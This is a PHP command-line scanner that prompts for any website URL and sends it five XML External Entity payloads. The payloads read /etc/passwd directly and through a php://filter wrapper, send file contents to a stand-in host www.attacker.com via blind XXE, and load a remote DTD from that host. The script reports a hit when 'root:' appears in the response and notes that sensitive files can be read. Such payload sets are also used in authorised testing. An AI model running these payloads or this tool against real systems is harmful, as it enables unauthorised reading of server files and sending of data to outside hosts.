<?php

// Define colors for better readability
class ConsoleColors {
    const RESET = "\033[0m";
    const RED = "\033[31m";
    const GREEN = "\033[32m";
    const YELLOW = "\033[33m";
}

// Function to test for XXE vulnerability with multiple payloads
function testXXE($targetUrl) {
    $payloads = [
        // Basic XXE payload
        <<<EOF
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <name>&xxe;</name>
</root>
EOF,

        // XXE payload with a PHP wrapper
        <<<EOF
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
    <name>&xxe;</name>
</root>
EOF,

        // XXE payload with blind XXE technique
        <<<EOF
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY callhome SYSTEM "www.attacker.com/?%xxe;">
]>
<root>
    <name>&callhome;</name>
</root>
EOF,

        // XXE payload with HTTP request
        <<<EOF
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://www.attacker.com/xxe.txt">
]>
<root>
    <name>&xxe;</name>
</root>
EOF,

        // XXE payload with parameter entity
        <<<EOF
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % xxe SYSTEM "http://www.attacker.com/xxe.dtd">
%xxe;
]>
<root>
    <name>test</name>
</root>
EOF
    ];

    $vulnerable = false;

    // Iterate through each payload and test for XXE vulnerability
    foreach ($payloads as $index => $payload) {
        echo "Testing payload #" . ($index + 1) . PHP_EOL;
        echo "Sending payload to: " . $targetUrl . PHP_EOL;

        // Send the payload to the target URL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $targetUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/xml'));
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // Check if the response contains the content of /etc/passwd
        if (strpos($response, 'root:') !== false) {
            echo ConsoleColors::RED . "The target website is vulnerable to XXE using payload #" . ($index + 1) . "!" . ConsoleColors::RESET . PHP_EOL;
            echo ConsoleColors::YELLOW . "To exploit this vulnerability, you can read sensitive files like /etc/passwd." . ConsoleColors::RESET . PHP_EOL;
            $vulnerable = true;
        } else {
            echo ConsoleColors::GREEN . "Payload #" . ($index + 1) . " did not trigger XXE vulnerability." . ConsoleColors::RESET . PHP_EOL;
        }
        echo PHP_EOL;
    }

    // If none of the payloads trigger the vulnerability
    if (!$vulnerable) {
        echo ConsoleColors::GREEN . "The target website is not vulnerable to XXE." . ConsoleColors::RESET . PHP_EOL;
    }
}

// Main program
echo "Enter your target website URL: ";
$targetUrl = trim(fgets(STDIN));

// Test for XXE vulnerability
testXXE($targetUrl);
